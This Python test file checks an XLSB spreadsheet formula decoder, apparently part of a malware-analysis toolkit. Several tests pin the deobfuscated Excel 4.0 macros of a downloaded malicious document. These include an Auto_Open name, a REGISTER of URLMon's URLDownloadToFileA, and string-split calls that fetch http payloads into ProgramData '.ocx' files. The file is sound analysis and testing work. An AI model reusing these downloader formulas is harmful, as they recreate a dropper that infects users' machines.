from __future__ import annotations

import io
import zipfile

from collections.abc import Iterator

from refinery.lib.excel import open_workbook
from refinery.lib.excel.formula import parse_formula, synthesize_formula
from refinery.lib.excel.formula.model import (
    Expression,
    XlDefinedName,
    XlUnparsedFormula,
)
from refinery.lib.scripts import TREE_RECURSION_DEPTH, RecursionDepth, canonical

from ... import TestBase
from .samples import DATES_XLSB, TEST_1904_XLSB, TEST_XLSB

_MALDOC = 'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'

_TEST_FORMULA_TEXTS = {
    ('Test', 1, 3): '"A"',
    ('Test', 1, 4): '"B"',
    ('Test', 2, 5): '1',
    ('Test', 2, 6): '42.1337',
    ('Test', 2, 7): '-1',
    ('Test', 2, 8): '-42.1337',
    ('Test', 3, 3): 'TRUE',
    ('Test', 3, 4): 'FALSE',
    ('Test', 4, 3): '1/0',
    ('Test', 4, 4): '#REF!',
    ('Test', 5, 4): 'A5',
    ('Test', 5, 5): 'B5',
    ('Test', 5, 6): 'C5',
}


def _formula_texts(data: bytes) -> dict[tuple[str, int, int], str]:
    """
    The synthesized formula text of every cell whose formula the reader decodes, keyed by sheet
    name and one-based cell coordinates.
    """
    workbook = open_workbook(data)
    return {
        (sheet.name, cell.row, cell.col): synthesize_formula(formula)
        for sheet in workbook.sheets()
        for cell in sheet.cells()
        if cell.formula is not None
        and not isinstance(formula := workbook.formula(cell.formula), XlUnparsedFormula)
    }


def _references_a_defined_name(expression: Expression) -> bool:
    for node in expression.walk():
        if isinstance(node, XlDefinedName):
            return True
    return False


class TestXlsbFormulaDecoding(TestBase):

    def test_literals_operators_and_references(self):
        self.assertEqual(_formula_texts(TEST_XLSB), _TEST_FORMULA_TEXTS)
        self.assertEqual(_formula_texts(TEST_1904_XLSB), _TEST_FORMULA_TEXTS)

    def test_defined_names_of_the_workbook_part(self):
        data = self.download_sample(_MALDOC)
        workbook = open_workbook(data)
        self.assertEqual(
            [
                (record.name, record.sheet, synthesize_formula(workbook.formula(record.formula)))
                for record in workbook.defined_names()
            ],
            [
                ('Drwrgdfghfhf', None, ''),
                ('Fola', None, 'Tiposa!$E$16'),
                ('Ropaasf', None, '-679215104'),
                (
                    'Auto_Open'
                    + '7' * 114,
                    None,
                    'Tiposa!$G$1',
                ),
            ],
        )

    def test_a_name_reference_spells_the_name_and_not_its_formula(self):
        # the name operand of the REGISTER call is the defined name `Fola` itself, while the
        # retiring oracle replaces every name with the formula it was defined by
        self.assertEqual(
            _formula_texts(self.download_sample(_MALDOC))[('Vtreytr', 22, 6)],
            'REGISTER("uRl"&"Mon",Fola&"FileA",Tiposa!D20,"Drwrgdfghfhf",,Tiposa!D22,Tiposa!D23)',
        )

    def test_user_defined_call_names_its_callee_from_the_stack(self):
        texts = _formula_texts(self.download_sample(_MALDOC))
        self.assertEqual(
            texts[('Xwtrd', 21, 7)],
            'Drwrgdfghfhf(0,"h"&"t"&"tp"&":"&"/"&"/"&Tiposa!E21&Tiposa1!G11&Sheet2!K12'
            ',"C"&":\\"&"Pr"&"og"&"ra"&"mD"&"a"&"t"&"a\\Ropedjo1.ocx",0,0)',
        )
        self.assertEqual(
            texts[('Xwtrdferyy', 14, 4)],
            'Drwrgdfghfhf(0,"h"&"t"&"tp"&":"&"/"&"/"&Tiposa!E22&Tiposa1!G11&Sheet2!K12'
            ',"C"&":\\"&"Pr"&"og"&"ra"&"mD"&"a"&"t"&"a\\Ropedjo2.ocx",0,0)',
        )
        self.assertEqual(
            texts[('Xwtrd2', 17, 6)],
            'Drwrgdfghfhf(0,"h"&"t"&"tp"&":"&"/"&"/"&Tiposa!E23&Tiposa1!G11&Sheet2!K12'
            ',"C"&":\\"&"Pr"&"og"&"ra"&"mD"&"a"&"t"&"a\\Ropedjo3.ocx",0,0)',
        )


class TestXlsbFormulaAgainstPyxlsb2(TestBase):
    """
    The token stream of every formula cell decodes to the same program the retiring pyxlsb2
    reader reports for it, compared canonically so that number spellings, redundant parentheses
    and quoted sheet names cannot mask a match. Cells that reference a defined name are
    excluded, because the oracle spells every name as the formula it was defined by while the
    reader spells the name itself; their pinned expectations above cover them.
    """

    @staticmethod
    def _oracle_workbook(data: bytes):
        from pyxlsb2 import Workbook as Pyxlsb2Workbook
        from pyxlsb2.xlsbpackage import XlsbPackage

        # the oracle wants a path on disk, which a sample from the store must never get, so its
        # package is assembled around the zip that already sits in memory
        package = object.__new__(XlsbPackage)
        package._zf_path = '<memory>'
        package._zf = zipfile.ZipFile(io.BytesIO(data))
        return Pyxlsb2Workbook(package)

    def test_formula_programs_match_the_oracle(self):
        try:
            from pyxlsb2.formula import Formula
        except ImportError:
            self.skipTest('the pyxlsb2 oracle is not installed')
        samples = [
            ('test_xlsb', TEST_XLSB),
            ('dates_xlsb', DATES_XLSB),
            ('test_1904_xlsb', TEST_1904_XLSB),
            ('maldoc', self.download_sample(_MALDOC)),
        ]
        for name, data in samples:
            with self.subTest(sample=name):
                oracle_book = self._oracle_workbook(data)
                expected = {}
                for sheetinfo in oracle_book.sheets:
                    if sheetinfo.type not in ('macrosheet', 'worksheet'):
                        continue
                    sheet = oracle_book.get_sheet_by_name(sheetinfo.name)
                    with sheet:
                        for row in sheet.rows():
                            for cell in row:
                                if cell.formula is not None:
                                    expected[sheetinfo.name, cell.r + 1, cell.c + 1] = (
                                        Formula.parse(cell.formula).stringify(oracle_book)
                                    )
                workbook = open_workbook(data)
                actual = {}
                for sheet in workbook.sheets():
                    for cell in sheet.cells():
                        if cell.formula is None:
                            continue
                        formula = workbook.formula(cell.formula)
                        if isinstance(formula, XlUnparsedFormula):
                            continue
                        if _references_a_defined_name(formula):
                            continue
                        actual[sheet.name, cell.row, cell.col] = formula
                self.assertEqual(set(actual) & set(expected), set(actual))
                with RecursionDepth(TREE_RECURSION_DEPTH):
                    for key in actual:
                        oracle = parse_formula(expected[key])
                        self.assertNotIsInstance(oracle, XlUnparsedFormula)
                        self.assertEqual(
                            canonical(parse_formula(synthesize_formula(actual[key]))),
                            canonical(oracle),
                            F'{name} {key}: {expected[key]}',
                        )


def _record_positions(body: bytes | bytearray) -> Iterator[tuple[int, int, int]]:
    """
    The framing of an MS-XLSB stream walked record by record, yielding each record identifier
    with the offset and the length of its body.
    """
    position = 0
    while position < len(body):
        rtype = body[position]
        position += 1
        if rtype & 0x80:
            rtype = (rtype & 0x7F) | ((body[position] & 0x7F) << 7)
            position += 1
        length = 0
        for index in range(4):
            byte = body[position]
            position += 1
            length |= (byte & 0x7F) << (7 * index)
            if not byte & 0x80:
                break
        yield rtype, position, length
        position += length


class TestXlsbFormulaDefects(TestBase):

    @staticmethod
    def _corrupt_first_formula_token(data: bytes, part: str) -> bytes:
        """
        Overwrite the first token byte of the first formula record of the sheet part with the
        identifier of a token no decoder resolves, leaving the record framing intact so the
        reader still walks every cell of the sheet.
        """
        source = zipfile.ZipFile(io.BytesIO(data))
        body = bytearray(source.read(part))
        for rtype, position, _ in _record_positions(body):
            if 8 <= rtype <= 11:
                # the record body holds the column, the style, the cached result of the width
                # the record identifier selects, a reserved word, the formula length, and then
                # the token stream itself
                if rtype == 8:
                    count = int.from_bytes(body[position + 8:position + 12], 'little')
                    width = 4 + 2 * count
                elif rtype == 9:
                    width = 8
                else:
                    width = 1
                body[position + 8 + width + 6] = 0x01
                break
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w') as target:
            for info in source.infolist():
                content = bytes(body) if info.filename == part else source.read(info)
                target.writestr(info, content)
        return buffer.getvalue()

    @staticmethod
    def _with_sup_tabs_record(data: bytes | bytearray) -> bytes:
        """
        Insert a `BrtSupTabs` record between the opening of the externals section of the
        workbook part and its first supporting link. The record names the sheets of an
        external workbook, which belong to the external link part, so it must not open a
        supporting link and shift the indexes the extern-sheet table reads.
        """
        source = zipfile.ZipFile(io.BytesIO(data))
        body = bytearray(source.read('xl/workbook.bin'))
        insert = None
        for rtype, position, length in _record_positions(body):
            if rtype == 353:  # BrtBeginExternals
                insert = position + length
                break
        assert insert is not None
        # the identifier of the record, the length of its body, and a count of no sheets
        body[insert:insert] = b'\xE7\x02\x04\x00\x00\x00\x00'
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w') as target:
            for info in source.infolist():
                content = bytes(body) if info.filename == 'xl/workbook.bin' else source.read(info)
                target.writestr(info, content)
        return buffer.getvalue()

    def test_first_token_cut_inside_a_formula_record_is_a_carrier(self):
        data = self._corrupt_first_formula_token(TEST_XLSB, 'xl/worksheets/sheet1.bin')
        self.assertEqual(
            _formula_texts(data),
            {
                key: text
                for key, text in _TEST_FORMULA_TEXTS.items()
                if key != ('Test', 1, 3)
            },
        )
        workbook = open_workbook(data)
        cut = [
            cell
            for sheet in workbook.sheets()
            for cell in sheet.cells()
            if (sheet.name, cell.row, cell.col) == ('Test', 1, 3)
        ]
        self.assertEqual(len(cut), 1)
        self.assertIsInstance(workbook.formula(cut[0].formula), XlUnparsedFormula)

    def test_a_string_token_that_does_not_decode_is_a_carrier(self):
        part = 'xl/worksheets/sheet1.bin'
        source = zipfile.ZipFile(io.BytesIO(TEST_XLSB))
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w') as target:
            for info in source.infolist():
                content = source.read(info)
                if info.filename == part:
                    # the string token of the formula `"A"` holds one UTF-16 character, which
                    # becomes a high surrogate that no low surrogate follows
                    assert content.count(b'\x17\x01\x00A\x00') == 1
                    content = content.replace(b'\x17\x01\x00A\x00', b'\x17\x01\x00\x00\xD8')
                target.writestr(info, content)
        data = buffer.getvalue()
        self.assertEqual(
            _formula_texts(data),
            {
                key: text
                for key, text in _TEST_FORMULA_TEXTS.items()
                if key != ('Test', 1, 3)
            },
        )
        workbook = open_workbook(data)
        cell = next(
            cell
            for sheet in workbook.sheets()
            for cell in sheet.cells()
            if (sheet.name, cell.row, cell.col) == ('Test', 1, 3)
        )
        self.assertIsInstance(workbook.formula(cell.formula), XlUnparsedFormula)

    def test_cells_still_yield_when_the_token_stream_is_cut(self):
        original = open_workbook(TEST_XLSB)
        cut = open_workbook(
            self._corrupt_first_formula_token(TEST_XLSB, 'xl/worksheets/sheet1.bin'))
        self.assertEqual(
            [
                (cell.row, cell.col, cell.kind, cell.value)
                for sheet in cut.sheets()
                for cell in sheet.cells()
            ],
            [
                (cell.row, cell.col, cell.kind, cell.value)
                for sheet in original.sheets()
                for cell in sheet.cells()
            ],
        )

    def test_a_sup_tabs_record_opens_no_supporting_link(self):
        # the two names whose formulas resolve an extern-sheet index are the ones a supporting
        # link shifted past its table would degrade to a carrier of raw bytes
        data = self._with_sup_tabs_record(self.download_sample(_MALDOC))
        workbook = open_workbook(data)
        formulas = {
            record.name: synthesize_formula(formula)
            for record in workbook.defined_names()
            if (formula := workbook.formula(record.formula)) is not None
        }
        self.assertEqual(formulas['Fola'], 'Tiposa!$E$16')
        self.assertEqual(formulas['Auto_Open' + '7' * 114], 'Tiposa!$G$1')
